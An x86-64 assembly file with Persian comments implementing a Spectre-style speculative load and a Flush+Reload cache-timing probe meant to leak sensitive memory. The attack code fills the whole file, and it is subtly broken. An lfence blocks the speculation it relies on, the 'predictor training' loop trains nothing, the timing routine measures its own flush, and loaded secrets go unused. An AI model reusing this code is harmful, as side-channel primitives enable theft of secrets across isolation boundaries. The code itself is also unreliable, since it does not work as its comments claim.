section .text
global speculative_load, flush_reload

; بارگذاری حدسی داده‌های حساس بدون ایجاد دسترسی واقعی
speculative_load:
    mov rax, [rdi]          ; آدرس داده حساس
    lfence                  ; حصار برای جلوگیری از اجرای حدسی
    mov rbx, [rsi]          ; آدرس شاخص آرایه
    mov rcx, [rdx]          ; آدرس بافر پروب
    
    ; آموزش پیش‌بین شاخه
    mov r8, 100
.train_loop:
    dec r8
    jnz .train_loop
    
    clflush [rsi]           ; پاک‌سازی شاخص از کش
    mfence
    
    ; اجرای حدسی
    mov r9, [rbx]           ; دسترسی به شاخص - باعث پیش‌بینی اشتباه می‌شود
    shl r9, 12              ; 4096 بایت در هر خط
    mov al, [rcx + r9]      ; دسترسی به بافر پروب
    
    ret

; تشخیص دسترسی‌های حافظه از طریق زمان‌بندی کش
flush_reload:
    rdtscp
    shl rdx, 32
    or rax, rdx
    mov r8, rax             ; زمان شروع
    
    clflush [rdi]           ; پاک‌سازی آدرس هدف
    mfence
    
    mov al, [rdi]           ; دسترسی به آدرس
    rdtscp
    shl rdx, 32
    or rax, rdx
    sub rax, r8             ; محاسبه زمان دسترسی
    
    ret
    